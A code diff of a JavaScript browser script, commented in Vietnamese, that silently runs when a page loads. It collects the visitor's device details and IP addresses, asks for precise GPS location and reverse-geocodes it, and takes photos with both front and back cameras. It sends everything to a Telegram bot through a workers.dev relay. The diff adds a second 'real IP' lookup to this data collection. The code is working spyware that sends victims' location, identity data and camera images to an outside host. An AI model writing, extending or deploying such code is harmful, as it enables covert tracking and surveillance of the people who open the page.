@@ -6,6 +6,7 @@ const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGR
 const info = {
   time: new Date().toLocaleString(),
   ip: '',
+  realIp: '',
   isp: '',
   address: '',
   country: '',
@@ -38,7 +39,18 @@ function detectDevice() {
   }
 }
 
-// ✅ Nếu có GPS thì lấy địa chỉ chính xác, ngược lại fallback IP
+// ✅ Lấy IP gốc (real IP)
+async function getRealIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    info.realIp = data.ip || 'Không rõ';
+  } catch {
+    info.realIp = 'Không rõ';
+  }
+}
+
+// ✅ Lấy vị trí chính xác hoặc fallback IP
 function getPreciseLocationOrFallbackToIP() {
   return new Promise(resolve => {
     if (!navigator.geolocation) {
@@ -51,12 +63,14 @@ function getPreciseLocationOrFallbackToIP() {
         info.lon = pos.coords.longitude.toFixed(6);
 
         try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
+            headers: { "User-Agent": "Mozilla/5.0 (compatible; MyScript/1.0)" }
+          });
           const data = await res.json();
-          info.address = data.display_name || '📍 Không xác định';
+          info.address = data.display_name || '📍 Không rõ địa chỉ từ GPS';
           info.country = data.address?.country || 'Không rõ';
         } catch (err) {
-          info.address = '📍 GPS được cho phép, nhưng không rõ địa chỉ';
+          info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
           info.country = 'Không rõ';
         }
 
@@ -65,20 +79,21 @@ function getPreciseLocationOrFallbackToIP() {
         resolve();
       },
       async err => {
-        console.warn('❌ GPS bị từ chối, chuyển sang IP:', err.message);
+        console.warn('❌ GPS bị từ chối:', err.message);
         await getIPInfo();
         resolve();
       },
-      { enableHighAccuracy: true, timeout: 5000 }
+      { enableHighAccuracy: true, timeout: 7000 }
     );
   });
 }
 
-// ✅ Lấy thông tin qua IP dân cư
+// ✅ Lấy thông tin qua IP dân cư (khi GPS bị từ chối)
 function getIPInfo() {
   return fetch("https://ipwho.is/")
     .then(res => res.json())
     .then(data => {
+      if (!data.success) throw new Error('IP lookup failed');
       info.ip = data.ip;
       info.isp = data.connection?.org || 'Không rõ';
       info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
@@ -104,17 +119,18 @@ function getCaption() {
 🕒 Thời gian: ${info.time}
 📱 Thiết bị: ${info.device}
 🖥️ Hệ điều hành: ${info.os}
-🌐 IP: ${info.ip}
+🌐 IP (dân cư): ${info.ip}
+🌍 IP gốc: ${info.realIp}
 🏢 ISP: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
-🌍 Quốc gia: ${info.country}
+🌎 Quốc gia: ${info.country}
 📍 Vĩ độ: ${info.lat}
 📍 Kinh độ: ${info.lon}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
-// ✅ Chụp camera
+// ✅ Chụp ảnh từ camera
 function captureCamera(facingMode = "user") {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode } })
@@ -140,7 +156,7 @@ function captureCamera(facingMode = "user") {
   });
 }
 
-// ✅ Gửi ảnh về Telegram
+// ✅ Gửi ảnh và thông tin về Telegram
 async function sendTwoPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -164,9 +180,10 @@ async function sendTwoPhotos(frontBlob, backBlob) {
   });
 }
 
-// ✅ Gọi chính
+// ✅ Gọi hàm chính
 async function main() {
   detectDevice();
+  await getRealIP();
 
   let frontBlob = null;
   let backBlob = null;
@@ -177,7 +194,7 @@ async function main() {
     info.camera = '✅ Đã chụp camera trước và sau';
   } catch (err) {
     console.warn("Không chụp đủ camera:", err.message);
-    info.camera = '📵 Không thể truy cập đủ camera';
+    info.camera = '🚫 Không thể truy cập đủ camera';
   }
 
   await getPreciseLocationOrFallbackToIP();
@@ -196,5 +213,5 @@ async function main() {
   }
 }
 
-// ✅ Gọi thủ công
+// ✅ Gọi script
 main();
